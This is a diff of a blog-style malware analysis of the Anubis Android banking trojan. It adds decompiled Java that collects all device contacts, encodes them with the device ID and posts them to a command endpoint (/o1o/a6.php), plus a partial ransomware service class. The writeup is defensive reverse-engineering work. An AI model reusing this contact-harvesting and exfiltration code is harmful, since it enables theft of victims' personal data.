@@ -171,7 +171,7 @@ other than stealing your banking information.</p>
 - mobsf
 - jadx-gui
 </code></pre>
-<h1 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <h3 id="the-manifest">The manifest<a href="#the-manifest" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>to analyze the manifest
 <img src="/img/anubis/anubis_apktool.png" alt="extracting with apktool"></p>
@@ -646,7 +646,8 @@ Backtrace =&gt; 0x79f058b9d749 frida-agent-64.so!0x29b749
     <span style="color:#f92672">&lt;string</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;textPlayProtect&#34;</span><span style="color:#f92672">&gt;</span>The system does not work correctly, disable Google Play Protect!<span style="color:#f92672">&lt;/string&gt;</span>
     <span style="color:#f92672">&lt;string</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;lock_amount&#34;</span><span style="color:#f92672">&gt;&lt;/string&gt;</span>
 <span style="color:#f92672">&lt;/map&gt;</span>
-</code></pre></div><p>here&rsquo;s another agent to monitor what values are being written to the xml file.</p>
+</code></pre></div><p>This xml file explains what this malware is capable of.</p>
+<p>here&rsquo;s another agent to monitor what values are being written to the xml file.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#e6db74">&#39;use strict&#39;</span>;
 
 <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fds</span> <span style="color:#f92672">=</span> {};
@@ -1258,7 +1259,7 @@ Soo what this method actually does is, it starts recording audio on the given so
 </code></pre>
 <p>if it does, it replaces the name with an empty string and append the name to the end of <code>str</code>.</p>
 <p>here is the list of applications that anubis targets.</p>
-<p>Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at</p>
+<p>Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.</p>
 <h3 id="achieving-persistance-and-user-presence">Achieving Persistance and User Presence<a href="#achieving-persistance-and-user-presence" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>When we were analyzing the manifest xml file, we came across a broadcast receiver that listens for BOOT_COMPLETE. Let&rsquo;s take a look at that class.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
@@ -1503,8 +1504,74 @@ string of &ldquo;<code>getnumber</code>&rdquo; and <code>str</code>.</p>
 </code></pre></div><p>There&rsquo;s no need of explainations for this one. It is pretty clear that this one is the method that really sends the SMS messages. Now I&rsquo;m thinking of changing the name of <code>SomeHttpClass</code> to something more like <code>UtilClass</code> or <code>CrazyShitHappensHere</code>.</p>
 <p>after sending the messages, <code>onStartCommand</code> registers a Broadcast receiver, which is in fact, <code>receiver</code>.</p>
 <h3 id="reading-contacts">Reading Contacts<a href="#reading-contacts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<h3 id="ransomware">Ransomware<a href="#ransomware" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.wami */</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Contacts</span> <span style="color:#66d9ef">extends</span> Activity <span style="color:#f92672">{</span>
 
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle bundle<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>bundle<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+
+            <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+            <span style="color:#a6e22e">if</span> <span style="color:#f92672">(</span>stringExtra<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                GetContacts<span style="color:#f92672">(</span>getContentResolver<span style="color:#f92672">());</span>
+            <span style="color:#f92672">}</span>
+
+            <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            finish<span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+
+</code></pre></div><p>onCreate method initializes some local variables and calls another method that retrieves contact numbers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetContacts</span><span style="color:#f92672">(</span>ContentResolver contentResolver<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getNumber&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                Cursor query <span style="color:#f92672">=</span> contentResolver<span style="color:#f92672">.</span><span style="color:#a6e22e">query</span><span style="color:#f92672">(</span>ContactsContract<span style="color:#f92672">.</span><span style="color:#a6e22e">CommonDataKinds</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Phone</span><span style="color:#f92672">.</span><span style="color:#a6e22e">CONTENT_URI</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+                String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetNetworkCountry</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;) Numbers from the phone book&#34;</span><span style="color:#f92672">;</span>
+                <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>query<span style="color:#f92672">.</span><span style="color:#a6e22e">moveToNext</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+                    String string <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span><span style="color:#a6e22e">getString</span><span style="color:#f92672">(</span>query<span style="color:#f92672">.</span><span style="color:#a6e22e">getColumnIndex</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;data1&#34;</span><span style="color:#f92672">));</span>
+                    String string2 <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span><span style="color:#a6e22e">getString</span><span style="color:#f92672">(</span>query<span style="color:#f92672">.</span><span style="color:#a6e22e">getColumnIndex</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;display_name&#34;</span><span style="color:#f92672">));</span>
+                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>string<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;*&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>string<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> string<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">&gt;</span> 6 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>str<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span>string<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        str <span style="color:#f92672">=</span> str <span style="color:#f92672">+</span> string <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;     &#34;</span> <span style="color:#f92672">+</span> string2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/br&gt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span><span style="color:#f92672">;</span>
+                    <span style="color:#f92672">}</span>
+                <span style="color:#f92672">}</span>
+                SomeHttpClass bVar <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+                StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+                sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;p=&#34;</span><span style="color:#f92672">);</span>
+                sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Encode</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSSAID</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|&#34;</span> <span style="color:#f92672">+</span> str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|&#34;</span><span style="color:#f92672">));</span>
+                bVar<span style="color:#f92672">.</span><span style="color:#a6e22e">exfiltrate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;getNumber&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">);</span>
+                finish<span style="color:#f92672">();</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            finish<span style="color:#f92672">();</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>Inside the try block, <code>GetContacts</code> method checks if shared preference <code>getNumber</code> is equal to <code>true</code>. if so, method uses a ContentResolver to retrieve contact number. then it checks if <code>string</code> contatins <strong>&quot;*&quot;</strong> or <strong>&quot;#&quot;</strong>. it also checks if <code>str</code>, which is essentially the country code is in the retrieved number. if not, it appends <code>str</code> with the number.</p>
+<p>Then it sends it to an endpoint <code>/o1o/a6.php</code>. Note the line break (<!-- raw HTML omitted -->) appended to the end of the string. it seems like malware sends data back and forth using html format.</p>
+<p>It also sets shared preference value for <code>getNumber to true</code>.</p>
+<p>This service also implements a method that sends an SMS to every contact number with SMS body being the SSAID of the device.</p>
+<h3 id="ransomware">Ransomware<a href="#ransomware" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We saw it in the manifest that anubis has ransomware capabilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">wahiuolww</span> <span style="color:#66d9ef">extends</span> IntentService <span style="color:#f92672">{</span>
+
+    <span style="color:#75715e">/* renamed from: a */</span>
+    SomeHttpClass cls <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SomeHttpClass<span style="color:#f92672">();</span>
+
+    <span style="color:#75715e">/* renamed from: b */</span>
+    String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+
+    <span style="color:#75715e">/* renamed from: c */</span>
+    String str1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">wahiuolww</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wahiuolww&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+</code></pre></div>
       </div></div>
 
   
